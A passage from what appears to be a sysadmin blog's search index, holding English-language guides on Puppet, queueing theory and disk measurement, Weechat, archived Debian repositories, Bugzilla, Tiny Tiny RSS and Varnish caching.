source: Puppet tags: - info time: 2010-06-08 11:37:59.521132 +02:00 - !ruby/object:Puppet::Util::Log file: /etc/puppet/modules/sudo/manifests/init.pp level: :err line: 11 message: \"Failed to retrieve current state of resource: Could not retrieve information from source(s) puppet:///sudo/sudoers at /etc/puppet/modules/sudo/manifests/init.pp:11\" source: //sudo/File[/etc/sudoers] A prettier method by graphical interface also exists, it’s the Puppet Dashboard.\nAdvanced usage linkMonitoring Passenger linkThere are binaries that allow you to get information about your Passenger and tune it if needed:\n----------- General information ----------- max = 12 count = 0 active = 0 inactive = 0 Waiting on global queue: 0 ----------- Application groups ----------- And here’s another piece of information:\n--------- Apache processes --------- PID PPID VMSize Private Name ------------------------------------ 1841 1 91.9 MB 0.6 MB /usr/sbin/apache2 -k start 1846 1841 91.1 MB 0.6 MB /usr/sbin/apache2 -k start 1903 1841 308.0 MB 0.5 MB /usr/sbin/apache2 -k start 1904 1841 308.0 MB 0.5 MB /usr/sbin/apache2 -k start ### Processes: 4 ### Total private dirty RSS: 2.14 MB -------- Nginx processes -------- ### Processes: 0 ### Total private dirty RSS: 0.00 MB ---- Passenger processes ---- PID VMSize Private Name ----------------------------- 1847 22.9 MB 0.3 MB PassengerWatchdog 1852 31.6 MB 0.3 MB PassengerHelperAgent 1857 43.1 MB 5.8 MB Passenger spawn server 1860 79.9 MB 0.9 MB PassengerLoggingAgent ### Processes: 4 ### Total private dirty RSS: 7.26 MB Checking the syntax of your .pp files linkWhen you create/edit a puppet module, it can be quickly very practical to check the syntax. Here’s how:\npuppet parser validate init.pp And if you want to do it on a larger scale:\nfind /etc/puppet/ -name '*.pp' | xargs -n 1 -t puppet parser validate Overriding restrictions linkIf, for example, we’ve defined a class and for certain hosts we want to modify this configuration, we need to do it like this:\nclass somehost_postfix inherits postfix { # blah blah blah } node somehost { include somehost_postfix } Let’s say we have a defined postfix module. We want to apply a particular config to certain hosts defined here by ‘somehost’. To bypass the configuration, you need to create a class ‘somehost_postfix’. I insist here on the nomenclature of the name to give for this class since it’s only like this that Puppet will recognize that you want to apply a particular configuration.\nDisabling a resource linkTo temporarily disable a resource, just set noop to true:\nfile { \"/etc/passwd\": noop =\u003e true} Pre and Post puppet run linkIt’s possible to run scripts before and after a Puppet run. This can be useful in the case of backing up certain files via etckeeper for example. Add this to your puppet.conf file on your clients:\n[...] prerun_command = /usr/local/bin/before-puppet-run.sh postrun_command = /usr/local/bin/after-puppet-run.sh CFT linkCFT (pronounced shift) is a small software that will look at what you do during a given period to generate a manifest for you. For example, you launch it just before doing an installation with its configuration and it will generate the manifest once completed. An example is better than a long speech:\ncft begin apache [...] cft finish apache cft manifest apache Generating a manifest from an existing system linkHere’s a simple solution to generate a manifest from an already installed system by specifying a resource. Here are some examples:\npuppet resource user root puppet resource service httpd puppet resource package postfix Puppet Push linkPuppet works in client -\u003e server mode. It’s the client that contacts the server every 30 minutes (by default) and asks for synchronization. When you’re in dumb mode or when you want to trigger at a specific time the update of your client machines to the server, there’s a special mode (listen). The problem is that the puppet client can’t run in client and listen mode. So you need 2 instances… in short, the nightmares begin.\nTo overcome this problem, I’ve developed Puppet push which allows asking clients (via SSH) to synchronize. As you’ll have understood, it’s more than necessary to have a key exchange done beforehand with the clients. How to do it? No worries, we’ve seen that above.\nTo access the latest version, follow this link: http://www.deimos.fr/gitweb/?p=puppet_push.git;a=tree\nMCollective linkMCollective is a bit of a gas plant, but it’s very powerful and works very well with Puppet. It allows you like Puppet Push to do several actions on nodes, but uses a dedicated protocol, it doesn’t need SSH to communicate with the nodes. To learn more, look at this article.\nFAQ linkerr: Could not retrieve catalog from remote server: hostname was not match with the server certificate linkYou have a problem with your certificates. The best thing is to regenerate a certificate with all the server’s hostnames in this certificate: Creating a certificate\nResources link http://reductivelabs.com/products/puppet/ http://www.rottenbytes.info Modules for Puppet Puppet recipes Types of objects for Puppet Puppet SSL Explained (/pdf) http://puppetcookbook.com/ "
            }
        );
    index.add(
            {
                id:  220 ,
                href: "\/Th%C3%A9orie_des_files_d%5C%27attentes\/",
                title: "Queueing Theory",
                description: "An overview of queueing theory, Little's Law, wait times, completion rates, and predicting system limits",
                content: "Introduction linkQueueing theory is a mathematical theory in the field of probability, which studies optimal solutions for managing waiting lines, or queues. A queue is necessary and will create itself if not anticipated, in all cases where supply is less than demand, even temporarily. It can apply to different situations: management of aircraft taking off or landing, waiting of customers and administrators at counters, or storage of computer programs before processing. This field of research, born in 1917 from the work of Danish engineer Erlang on the management of Copenhagen telephone networks between 1909 and 1920, studies in particular arrival systems in a queue, the different priorities of each new arrival, as well as statistical modeling of execution times. It is thanks to the contributions of mathematicians Khintchine, Palm, Kendall, Pollaczek and Kolmogorov that the theory really developed.\nLittle’s Law linkLittle mathematically demonstrated what Erlang had said years earlier. Here is the law:\nL = A x W\nL: The queue length that corresponds to an average of requests waiting in the system A: This is the rate at which requests enter the system (x/second) W: Average time to satisfy a request Queue Size linkRequests are stored in memory. Therefore L can be a tunable read/write cache or a read-only cache for measurements. There are algorithms to manage queue priorities:\nTwo queues (1 for urgent requests, 1 for normal requests). Requests are processed according to their urgency. A single queue that will process urgent requests first. Normal requests will only be processed if there are no more urgent ones. Queue Size and Waiting Time linkL tends to vary directly with W. Simple example:\n100 requests = 100 requests/second _ 1s\n200 requests = 100 requests/second _ 2s\n800 requests = 100 requests/second * 8s\nWe can therefore predict the waiting time performance by restricting the queue size. Similarly, we can restrict the waiting time to optimize the queue size (in memory).\nWaiting Time linkThe waiting time includes:\n(W = Q + S)\nQueue time: waiting time for a resource to become available Service time: time for a resource to execute a request The goal is to reduce both queue time and service time. For example, a waiting time corresponds to a web page loading. Its execution time can take a certain amount of time which can be multiplied according to the number of parallel requests.\nIf we look from a more system-oriented perspective:\nW = Q + (T(system) + T(user))\nSystem time: time for a kernel task User time: time for a user task You can get more information in the man page of the time command or in top. The goal is therefore:\nTo reduce system time (but will block operations for users) Spend as much time as necessary on user tasks (but no more) The service time corresponds to the time a process takes to execute a task inserted in the queue until the end of its execution. This type of service can be calculated as utilization / throughput. The average service time is defined by the amount of occupancy of a resource per request: S = Occupancy time / completions per second\nUser Time Algorithms linkThere are asymptotic complexities that help understand the necessary user time to execute x requests:\nIntractable: O(2^n) Polynomial: O(n^2) Linear: O(50n) Constant: O(1) Logarithmic: O(500 log n) Note: O describes the order of growth rate at a time of execution or memory usage of an algorithm when its inputs grow.\nWhen changing algorithms, performance can be improved by reducing waiting time and increasing throughput (number of actions).\nProfiling with the time Command linkThe time command allows you to know the execution time of a command:\n\u003e export TIME=\"\\n%e %S %U\" \u003e time tar -czf deimos.tgz /home/deimos real 0m0.017s user 0m0.001s sys 0m0.001s real: this is the actual time the application takes to execute user: this is the CPU time needed to execute its instructions sys: this is the time that the CPU takes for kernel calls or waiting for I/O To get the queue time: Q = W - (Tsys + Tuser)\nCompletion Rate linkThe bandwidth (theoretical) corresponds to a data size that can be transferred in a certain amount of time. The bandwidth (real) corresponds to a data size that is transferred in a certain amount of time. The throughput corresponds to a size of usable data that is transferred in a certain amount of time. The overhead is the difference between the real bandwidth and the throughput. It’s the surplus of real data transferred. For data transferred at a certain bandwidth, the throughput will always be less than the bandwidth.\nThe completion rate is the rate at which work is performed at a certain throughput or bandwidth:\nx = work done / observation time\nBandwidth is generally predictable, but overhead can be reduced to speed up processing time. For example, on a 100Mb/s network, we can measure 80Mb/s of data at the application layer (OSI). Because in fact, we have 20Mb/s of overhead (20 + 80 = 100). If we reduce the overhead to 10, we can increase the throughput to 90Mb/s.\nB (bandwidth) = X (transfers) + O (overhead)\nHowever, it should be known that reducing overhead can inflict undesirable behavior. For example, if we decide to reduce overhead by choosing UDP instead of TCP for an application (since UDP has less overhead than TCP). If there is packet loss on the network, the application may request retransmission of the request. As a result, the application might generate more overhead than with TCP sessions. Depending on the applications, data does not necessarily need to be retransmitted (such as online music sites). After a certain number of packets not transmitted, the client can give an error message for bad data transmission.\nArrival Rate and Completion Rate linkThe completion rate is the rate at which work is performed and is related to throughput, as well as bandwidth (depending on the context).\nA (number of arrivals) = C (number of completions) / T (observation time)\nT: the observation time corresponds to the time allotted for the execution of events in a given time (e.g., in seconds) A: The number of arrivals observed during the observation period (e.g., packets/s) The number of arrivals (A) that were made during an observation time (T) are referenced as completed (C). The occupancy time is the observation time * the utilization time.\nFinding the Best Observation Time linkIt is important to use these kinds of tools during non-zero load times. Making an observation during too short a time will not allow for satisfactory results. It is therefore advised to measure the observation time in the following way:\nCollect data as frequently as possible (ideally 1 second) Compare the measurement values according to Little’s Law Is the comparison good? yes: the observation time is valid and L = C x W no: redo the capture with a longer time interval We will now calculate the queue length and compare it to the collected data. Here is an example of capture:\n\u003e dd if=/dev/zero of=/tmp/bigfile bs=1M count=1024 oflag=direct \u0026 sar -d -p 1 5 \u003e sar_result ; pkill dd \u0026\u0026 rm -f /tmp/bigfile ; cat sar_result 23:45:05 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 23:45:06 sda 227,00 9872,00 16288,00 115,24 6,85 28,58 4,39 99,60 23:45:06 dev254-0 1,00 0,00 8,00 8,00 2,23 2836,00 284,00 28,40 23:45:06 dev254-1 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 23:45:06 dev254-2 206,00 10056,00 424,00 50,87 7,17 34,00 4,82 99,20 23:45:06 dev254-3 2541,00 40,00 20288,00 8,00 100,64 33,19 0,12 30,00 23:45:06 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 23:45:07 sda 114,85 2811,88 12110,89 129,93 9,98 89,90 8,62 99,01 23:45:07 dev254-0 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 23:45:07 dev254-1 0,99 0,00 7,92 8,00 0,07 68,00 68,00 6,73 23:45:07 dev254-2 84,16 2471,29 0,00 29,36 3,86 47,25 11,76 99,01 23:45:07 dev254-3 21,78 253,47 166,34 19,27 16,84 1514,73 37,09 80,79 23:45:07 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 23:45:08 sda 207,00 4672,00 1304,00 28,87 6,09 29,72 4,83 100,00 23:45:08 dev254-0 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 23:45:08 dev254-1 162,00 0,00 1296,00 8,00 59,80 369,14 4,02 65,20 23:45:08 dev254-2 185,00 4216,00 0,00 22,79 5,07 27,70 5,38 99,60 23:45:08 dev254-3 5,00 288,00 0,00 57,60 0,18 36,00 36,00 18,00 23:45:08 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 23:45:09 sda 173,00 3208,00 0,00 18,54 3,54 19,93 5,78 100,00 23:45:09 dev254-0 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 23:45:09 dev254-1 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 23:45:09 dev254-2 171,00 2744,00 0,00 16,05 3,30 18,76 5,85 100,00 23:45:09 dev254-3 3,00 520,00 0,00 173,33 0,16 54,67 54,67 16,40 23:45:09 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 23:45:10 sda 155,56 3797,98 1470,71 33,87 3,29 21,71 6,36 98,99 23:45:10 dev254-0 1,01 8,08 0,00 8,00 0,06 60,00 60,00 6,06 23:45:10 dev254-1 84,85 0,00 678,79 8,00 5,16 60,86 2,81 23,84 23:45:10 dev254-2 242,42 3498,99 791,92 17,70 6,40 26,77 4,02 97,37 23:45:10 dev254-3 1,01 242,42 0,00 240,00 0,08 76,00 76,00 7,68 23:45:10 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 23:45:11 sda 74,75 1252,53 13292,93 194,59 0,95 12,81 5,35 40,00 23:45:11 dev254-0 43,43 8,08 339,39 8,00 0,40 9,12 3,44 14,95 23:45:11 dev254-1 90,91 0,00 727,27 8,00 3,03 33,29 0,93 8,48 23:45:11 dev254-2 27,27 1204,04 0,00 44,15 0,28 10,81 8,30 22,63 23:45:11 dev254-3 1530,30 8,08 12234,34 8,00 25,25 16,36 0,16 25,05 ... Based on the columns that sar gives us, here is the formula:\n(rd_sec/s + wr_sec/s) * await / 1000 = requests/s\nSo if we take the information above, we can easily calculate like this (on sda here):\n\u003e grep sda sar_result | awk '{ printf(\"%s%s%s%s\", \"(\"$4\" + \", $5\") * \", $8\" / 1000) = \", (($4+$5)*$8)/1000\"\\n\") }' (9872,00 + 16288,00) * 28,58 / 1000) = 732.48 (2811,88 + 12110,89) * 89,90 / 1000) = 1327.97 (4672,00 + 1304,00) * 29,72 / 1000) = 173.304 (3208,00 + 0,00) * 19,93 / 1000) = 60.952 (3797,98 + 1470,71) * 21,71 / 1000) = 110.607 (1252,53 + 13292,93) * 12,81 / 1000) = 174.528 (1837,62 + 1900,99) * 13,89 / 1000) = 48.581 (2407,92 + 22922,77) * 42,17 / 1000) = 1063.82 (290,91 + 371,72) * 4,00 / 1000) = 2.644 (1096,00 + 96,00) * 7,64 / 1000) = 8.344 (118,10 + 3126,40) * 3,74 / 1000) = 9.732 It is interesting to let these kinds of tools run for a while to profile an application on a server, for example, and realize during a high load period the number of requests available.\nPredicting System Limits linkIt’s important to know that a saturated resource is the bottleneck for the entire system! You must therefore ensure that there is no funnel effect on your resources.\nReducing the number of accesses or improving bandwidth helps solve the problem, whether it’s for CPU, RAM, Network, or anything else.\nIt is therefore important to know both the arrival rate and the necessary bandwidth to properly configure your hardware.\n"
            }
        );
    index.add(
            {
                id:  221 ,
                href: "\/Unbound_:_Mise_en_place_d%27un_serveur_DNS_nouvelle_g%C3%A9n%C3%A9ration\/",
                title: "Unbound: Implementing a Next Generation DNS Server",
                description: "Guide for installing and configuring Unbound, a next-generation DNS server with secure connections and high availability.",
                content: "Unbound is a next-generation DNS server that provides secure connections between DNS servers. It’s also designed for high availability and small usages:\nDocumentation on Installing And Using The Unbound Name Server\n"
            }
        );
    index.add(
            {
                id:  222 ,
                href: "\/Weechat_:_a_user_friendly_IRC_client\/",
                title: "Weechat: A User Friendly IRC Client",
                description: "Guide to installing and configuring Weechat IRC client on Linux systems with a focus on Freenode setup and channel autoconnect features.",
                content: " Software version 0.3.8 Operating System Debian 7 Website Weechat Website Last Update 17/07/2013 Introduction linkWeeChat is a fast, light and extensible chat client. It runs on many platforms (including Linux, BSD and Mac OS).\nWeeChat is:\nmodular: a lightweight core with plugins around multi-protocols: IRC and Jabber (other soon) extensible: C plugins and scripts (Perl, Python, Ruby, Lua, Tcl and Scheme) free software: released under GPLv3 license fully documented: user’s guide, API, FAQ,.. translated in many languages Development is very active, and bug fixes are very fast!\nInstallation linkThe installation part is really easy:\naptitude install weechat-curses To launch it:\nweechat-ncurses Configuration linkFreenode configuration linkIf you want to store your freenode configuration, edit and adapt this configuration file (~/.weechat/irc.conf):\n[server_default] [...] nicks = \"username1,username2,username3\" password = \"pass\" realname = \"realname\" username = \"username\" [...] Autoconnect to channels linkIf you want to autoconnect to a specific channel (~/.weechat/irc.conf):\n[server_default] [...] autoconnect = on autojoin = \"#channel1,#channel2\" [...] And if channel 1 requires a password for instance (~/.weechat/irc.conf):\n[server_default] [...] autoconnect = on autojoin = \"#channel1,#channel2 password\" [...] References link Weechat Website "
            }
        );
    index.add(
            {
                id:  223 ,
                href: "\/How_to_use_old_Debian_repository_for_unmaintained_Debian_versions\/",
                title: "How to use old Debian repository for unmaintained Debian versions",
                description: "A guide on how to configure Debian to use archive repositories for unmaintained Debian versions.",
                content: " Operating System Debian X Website Debian Website Last Update 05/07/2013 Introduction linkInstalling old Debian to prepare a migration is quite good when repositories are still available. But for old unmaintained versions of Debian, we need to change some things.\nThis is what we’re gonna look here.\nUsage linkFor this example, we’re going to take lenny version which is totally deprecated. To make repository work, we need to change the repository url by ‘archives’:\n# /etc/apt/sources.list deb http://archive.debian.org/debian/ lenny main non-free contrib deb-src http://archive.debian.org/debian/ lenny main non-free contrib # Volatile: deb http://archive.debian.org/debian-volatile lenny/volatile main contrib non-free deb-src http://archive.debian.org/debian-volatile lenny/volatile main contrib non-free # Backports: deb http://archive.debian.org/debian-backports lenny-backports main contrib non-free # Previously announced security updates: deb http://archive.debian.org/debian-security lenny/updates main That’s all, you can update.\ninfo It works with all Debian versions References linkhttps://superuser.com/questions/404806/did-debian-lenny-repositories-vanish\n"
            }
        );
    index.add(
            {
                id:  224 ,
                href: "\/Bugzilla_:_mise_en_place_d\u0027un_outil_de_ticketing\/",
                title: "Bugzilla: Setting Up a Ticketing Tool",
                description: "How to install and configure Bugzilla as a ticketing and bug tracking system",
                content: " Software version 4.2.5 Operating System Debian 6 Website Bugzilla Website Last Update 03/07/2013 Introduction linkBugzilla is a free web-based bug tracking system with a web interface, developed and used by the Mozilla Organization. It allows tracking of bugs or “Request for Enhancement” (RFE) in the form of “tickets”. It is a server-side software with a three-tier architecture, written in Perl. It is available on UNIX (Linux, BSD, etc.) and is distributed under the tri-license MPL/LGPL/GPL.\nIt is used by many organizations to track the development of numerous software applications, on the Internet or in private networks. The most well-known users include the Mozilla Foundation, Facebook, NASA, YAHOO, GNOME, KDE, Red Hat, Novell, and Mandriva.1\nInstallation linkWe will need a web server to set up Bugzilla. We’ll keep it simple and use Apache, along with a MySQL database:\naptitude install apache2 mysql-server libapache2-mod-perl2 Then we’ll install all the Bugzilla dependencies:\naptitude install libtimedate-perl libdatetime-perl libtemplate-perl libemail-send-perl libemail-mime-perl libdbi-perl liburi-perl libmath-random-isaac-perl libdbd-mysql-perl libgd-gd2-perl libchart-perl libtemplate-plugin-gd-perl libmime-tools-perl libwww-perl libxml-twig-perl libnet-ldap-perl libauthen-sasl-perl libauthen-radius-perl libsoap-lite-perl libjson-rpc-perl libtest-taint-perl libhtml-scrubber-perl libencode-detect-perl Then we’ll download the latest version of Bugzilla and extract it:\ncd /var/www wget http://ftp.mozilla.org/pub/mozilla.org/webtools/bugzilla-4.2.5.tar.gz tar -xzf bugzilla-4.2.5.tar.gz If you’re still missing modules, you can use the non-Debian-integrated solution that will install everything needed:\ncd bugzilla-4.2.5 /usr/bin/perl install-module.pl --all Configuration linkMySQL linkFor MySQL configuration, we’ll tune some parameters by adding these lines to the configuration:\n[mysqld] # Allow packets up to 4MB max_allowed_packet=4M # Allow small words in full-text indexes ft_min_word_len=2 Restart MySQL for these parameters to take effect. Then create the database, a user, and its MySQL permissions (replace the password with what you want):\nCREATE DATABASE bugs; CREATE USER 'bugs'@'localhost' IDENTIFIED BY 'bugs'; GRANT SELECT, INSERT, UPDATE, DELETE, INDEX, ALTER, CREATE, LOCK TABLES, CREATE TEMPORARY TABLES, DROP, REFERENCES ON bugs.* TO bugs@localhost IDENTIFIED BY 'bugs'; FLUSH PRIVILEGES; Apache linkFor Apache to handle perl/CGI scripts, we’ve installed mod_perl. Now we need to configure the Apache directories:\n[...] AddHandler cgi-script .cgi Options +Indexes +ExecCGI DirectoryIndex index.cgi AllowOverride Limit FileInfo Indexes [...] Reload your Apache configuration afterward.\nBugzilla linkWe need to run the check tool for the first time to create our configuration file:\n./checksetup.pl Now, set your variables in the configuration file to match your database and web server information:\n[...] $webservergroup = 'www-data'; $db_name = 'bugs'; $db_user = 'bugs'; $db_pass = 'bugs'; [...] Feel free to adapt with your own information.\nThen, rerun the configuration tool, which will create everything you need for your database:\n\u003e ./checksetup.pl Adding new table bz_schema... Initializing bz_schema... Creating tables... Converting attach_data maximum size to 100G... Setting up choices for standard drop-down fields: priority bug_status rep_platform resolution bug_severity op_sys Creating ./data directory... Creating ./data/attachments directory... Creating ./data/db directory... Creating ./data/extensions directory... Creating ./data/mining directory... [...] Enter the e-mail address of the administrator: xxx@mycompany.com Enter the real name of the administrator: Deimos Enter a password for the administrator account: Please retype the password to verify: xxx@mycompany.com is now set up as an administrator. It should have now asked for and validated the Administration information (login + password).\nCrontab linkWe’ll also create a crontab that will execute a set of scripts for graphs and whining:\n#!/bin/sh 5 0 * * * cd /var/www/bugzilla \u0026\u0026 ./collectstats.pl 55 0 * * * cd /var/www/bugzilla \u0026\u0026 ./whineatnews.pl */15 * * * * cd /var/www/bugzilla \u0026\u0026 ./whine.pl Add the proper permissions and restart the cron service:\nchmod 755 /etc/cron.daily/bugzilla service cron restart Adding an Administrator linkIf you want to add an Admin, it’s simple. The account must already exist on Bugzilla, then:\n\u003e ./checksetup.pl --make-admin=xxx@mycompany.com [...] Removing existing compiled templates... Precompiling templates...done. Fixing file permissions... xxx@mycompany.com is now set up as an administrator. Now that you have installed Bugzilla, you should visit the 'Parameters' page (linked in the footer of the Administrator account) to ensure it is set up as you wish - this includes setting the 'urlbase' option to the correct URL. Adjust this command with the email address of the user you want to make an Admin. After that, all you need to do is connect to it: http://myserver/bugzilla :-)\nReferences link http://fr.wikipedia.org/wiki/Bugzilla ↩︎\n"
            }
        );
    index.add(
            {
                id:  225 ,
                href: "\/Tiny_Tiny_RSS_:_Une_alternative_%C3%A0_Google_Reader\/",
                title: "Tiny Tiny RSS: An Alternative to Google Reader",
                description: "How to set up and configure Tiny Tiny RSS as an alternative to Google Reader, including installation, MySQL configuration, and importing from Google Reader",
                content: " Introduction linkFor years I’ve been happily using Google Reader. But increasingly, I’m reading from RSS feeds about people who have lost their data through Google. Even in enterprise mode, it’s not possible today to easily and automatically back up your data.\nI’ve therefore chosen not to leave my data with Google and to take care of it myself. I’ve selected Tiny Tiny RSS which aims to be a very good alternative to Google Reader.\nInstallation linkFor prerequisites, we need a LAMP-type server with some specific options:\naptitude install php5-curl php5-cli Then we’ll install Tiny Tiny RSS:\ncd /var/www wget http://tt-rss.org/download/tt-rss-1.6.2.tar.gz tar -xzf tt-rss-1.6.2.tar.gz rm -f tt-rss-1.6.2.tar.gz mv tt-rss-1.6.2 tinyrss chown -Rf www-data. tinyrss MySQL linkI’ve chosen MySQL as a backend for Tiny Tiny RSS. We’ll initialize the database and its users (adapt as needed):\nCREATE DATABASE `tinyrss` ; CREATE USER 'tinyrss_user'@'localhost' IDENTIFIED BY '***'; GRANT USAGE ON * . * TO 'tinyrss_user'@'localhost' IDENTIFIED BY '***'; GRANT ALL PRIVILEGES ON `tinyrss` . * TO 'tinyrss_user'@'localhost'; Then we’ll import the SQL schema:\nmysql -utinyrss_user -p tinyrss \u003c schema/ttrss_schema_mysql.sql Configuration linkFor configuration, we’ll use a config file:\nmv config.php{-dist,} Then we’ll edit this file to insert our database values:\n// Database server configuration define('DB_TYPE', \"mysql\"); // or pgsql define('DB_HOST', \"localhost\"); define('DB_USER', \"tinyrss_user\"); define('DB_NAME', \"tinyrss\"); define('DB_PASS', \"***\"); define('SELF_URL_PATH', 'http://www.deimos.fr/tinyrss'); define('SINGLE_USER_MODE', false); You can then connect to your server with admin/password.\nUpdating Feeds linkTo update your feeds and manage them from the web interface, we’ll use the provided daemon:\nsu - www-data -c \"php /var/www/tinytinyrss/update.php --daemon --quiet \u0026\" Exporting Google Reader Feeds linkIf like me you’re migrating from Google Reader to Tiny Tiny RSS, you can import your data.\nTo export your Google Reader data in OPML format via the command line, create a small script:\n#!/bin/sh curl -sH \"Authorization: GoogleLogin auth=$(curl -sd \"Email=$1\u0026Passwd=$2\u0026service=reader\" https://www.google.com/accounts/ClientLogin | grep Auth | sed 's/Auth=\\(.*\\)/\\1/')\" http://www.google.com/reader/subscriptions/export; Then to use it, run the script with your login and password as arguments:\n/backup_google_reader.sh user@gmail.com password \u003e google-reader-subscriptions.xml "
            }
        );
    index.add(
            {
                id:  226 ,
                href: "\/Varnish_:_un_acc%C3%A9l%C3%A9rateur_de_site_web\/",
                title: "Varnish: a website accelerator",
                description: "A comprehensive guide to Varnish, a powerful web cache server that can significantly improve website performance through caching, load balancing, and reverse proxy capabilities.",
                content: " Software version Varnish 2 Operating System Debian 6 Website Varnish Website Last Update 25/06/2013 Introduction linkVarnish is a cache server for Web servers. It makes websites much faster. It can also perform load balancing across multiple backend web servers or act as a reverse proxy. Basically, we place it in front of web servers to intercept requests, cache what is generated by the backends, and serve the generated content from its cache. But its functionality can go much further.\nVarnish is configured simply with two types of files. The Varnish configuration file where we define certain internal parameters and the VCL files that allow you to configure Varnish’s behavior via a kind of programming language.\nThe principle of Varnish is based on the following state machine:\nVarnish allows you to intervene at each state level to perform operations on HTTP or on itself. It’s this fine-grained intervention that makes Varnish both fast and comprehensive.\nA client making a request for a resource that is not in cache will follow this path:\nIf this resource is requested again, the path followed changes because the resource is now cached:\nAll these steps are symbolized in VCL by “standard procedures” (vcl_recv, vcl_fetch, vcl_deliver, etc.). All these procedures can be overridden, and we can also declare our own procedures that will be called in the standard procedures. The VCL language does not tolerate any orphaned code; everything declared must be used.\nInstallation linkOn Debian… always simple:\naptitude install varnish Configuration linkThe basics linkVCLs linkFirst, if Varnish is running on the same machine as your web server, point your current web server to another port (8080 for example), then restart it to apply the new configuration.\nNow we’ll modify the Varnish configuration to tell it which backend server to use. Adapt these lines to your configuration:\n... backend default { .host = \"127.0.0.1\"; .port = \"8080\"; } ... 127.0.0.1: the web server to which Varnish should redirect traffic 8080: the port of the web server in question The daemon linkCache on disk linkNext, we’ll modify the Varnish server configuration to give it some additional information:\n... # Should we start varnishd at boot? Set to \"yes\" to enable. START=yes [...] DAEMON_OPTS=\"-a :80 \\ -b localhost:8080 \\ -u varnish -g varnish \\ -S /etc/varnish/secret \\ -s file,/var/lib/varnish/$INSTANCE/varnish_storage.bin,1G\" [...] -a: the port on which the Varnish server will listen -b: the web server to which Varnish should redirect traffic -s: the 1GB cache file located on disk (lower performance than RAM) Cache in RAM linkYou might want your cache to be in RAM for even better access! This is entirely possible :-). I’ve taken the opportunity to add a few elements to optimize everything:\n... # Should we start varnishd at boot? Set to \"yes\" to enable. START=yes [...] DAEMON_OPTS=\"-a :80 \\ -b localhost:8080 \\ -S /etc/varnish/secret \\ -p thread_pools=2 \\ -p thread_pool_min=100 \\ -p thread_pool_max=2000 \\ -p thread_pool_add_delay=2 \\ -p session_linger=50 \\ -s malloc,512m\" [...] -a: the port on which the Varnish server will listen -b: the web server to which Varnish should redirect traffic -p thread_pools: insert the number of cores on your machine -p thread_pool_min (default: 5): Idle threads are harmless. This number is multiplied by the number of thread pools you have, and the total should be about what you need to run on a normal day. -p thread_pool_max (default 1000): The maximum number of threads is limited by available file descriptors, however, setting it too high won’t increase performance. Having idle threads is reasonably harmless, but don’t increase this number above 5000 or you risk having problems with file descriptors or worse. -p thread_pool_add_delay=2 (default 20ms): Reducing the add_delay option allows you to create threads faster, which is essential, especially at startup to avoid filling the queue and dropping requests. -p session_linger: to avoid context switching when bursting the CPU. -s malloc: probably the most interesting option here, allows using cache in RAM. Ideally, take 80% of your memory if possible. Then comment out the VCL block since we’ve just replaced it:\n#DAEMON_OPTS=\"-a :6081 \\ # -T localhost:6082 \\ # -f /etc/varnish/default.vcl \\ # -S /etc/varnish/secret \\ # -s file,/var/lib/varnish/$INSTANCE/varnish_storage.bin,1G\" Then restart Varnish:\n/etc/init.d/varnish restart And you’re done :-)\nThe Cache linkVarnish offers both memory cache and disk cache. But you have to make a choice, the two cannot be combined. The cache accepts pretty much everything that passes through Varnish (HTML pages, static files, JSON data streams, etc.), as long as the object is declared as cacheable and has a TTL.\nThe cache is populated just after the “Fetch” step, which is right after retrieving the data from the backend. This is where we make all the modifications to the HTTP header of the cached resource. Making these modifications at the “Fetch” level ensures a clean cache entry (not having multiple cache entries because the same resource will have a different payload). Additionally, the object is stored in the cache with its HTTP header, so it’s more efficient to process the header once and for all and serve it with the object.\nAs we’ll see later, object compression also affects cache performance. It’s preferable to store a compressed object and let Varnish deliver it compressed or not depending on the “Accept-Encoding” header.\nCorrectly defining the TTL of an object to manage cache-control is an important element of Varnish. We can control the cache precisely by defining the TTL for a resource type or for a URL, for example:\n... if(beresp.ttl \u003e 0s){ unset beresp.http.Expires; if ( req.backend == backend_S3 ) { set beresp.http.Cache-Control = \"public, max-age=60\"; set beresp.ttl = 60s; } else { set beresp.http.Cache-Control = \"public, max-age=7200\"; set beresp.ttl = 2h; } } ... Here we’re asking Varnish to cache for 60 seconds everything coming from the “backend_S3” backend, and everything else will be cached for two hours.\nThe cache can be managed in two different ways:\nVia HTTP calls using the PURGE method and managing ACLs to secure the call. Via “Bans” that can be included in the VCL or performed through varnishadm. Compression linkSince version 3.0, Varnish has the ability to compress and decompress resources. This feature is important for 3 reasons:\nSave bandwidth between the backend and Varnish. Save space in Varnish’s cache, especially when it’s in memory. Save bandwidth between Varnish and the Client. It can be simply activated by harmonizing the “Accept-Encoding” header and setting the “do_gzip” variable at the backend level or in the backend response. For the rest, Varnish will adapt the response (compressed object or not) to the client based on the “Accept encoding” of the request. It’s obviously clear that the compression strategy should be adapted to the object type. We won’t compress an already compressed object (gif, jpg, etc.) :).\nLoad Balancing linkVarnish can handle backends from all horizons. With increasingly loaded sites, it is capable of offering load balancing functionality. Varnish has 3 types of load balancing called “Directors”:\nRoundRobin Client (allows sticky sessions on any header element). Random (available… but whether it’s useful is another story). Varnish knows how to handle the eviction of a backend when it’s unavailable. This feature is even more useful when we activate the “probe” on backends.\n... backend server1 { .host = \"server1.deimos.fr\"; .probe = { .url = \"/\"; .interval = 5s; .timeout = 1s; .window = 5; .threshold = 3; } } ... Varnish also has a mechanism to completely compensate for the failure of a backend or a Director. We call this “Grace mode” or “Saint mode”. These terms hide the possibility of serving cached content even x minutes after the TTL in case of non-response from a server. It can also route a request to another server that is responding correctly when the initial target server gives HTTP 500 responses due to too much load, for example.\nReverse Proxy linkWe’ve seen that Varnish is positioned in front of our entire infrastructure. It will allow us to completely mask the deployed architecture by using all the power of the Reverse Proxy it provides.\nIn fact, it allows us to completely decouple the organization of the calling URIs from the organization of their processing on the infrastructure.\nHere’s an example of a client request that we manage to route with Varnish to a public S3 bucket named “ressources”, and the routing takes into account what is in the 